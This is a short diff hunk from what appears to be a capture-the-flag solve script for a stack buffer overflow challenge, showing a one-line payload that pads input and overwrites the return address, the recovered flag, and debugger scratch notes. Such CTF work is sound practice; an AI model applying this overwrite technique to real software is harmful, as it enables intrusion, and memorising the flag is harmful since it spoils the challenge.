@@ -20,6 +20,8 @@ On a 64 bit system, the return address looks like this: 0x00007fff 0x004013cc
 print "a"*nameOffset + "\xff\x7f\x00\x00\xb6\x11\x40\x00"
 #The flag is actf{overflowed_more_than_just_a_fish_tank}
 
+
+#Scratch work below
 # rdi is 0x7fffffffdff0
 # b *0x000000000040131c
 
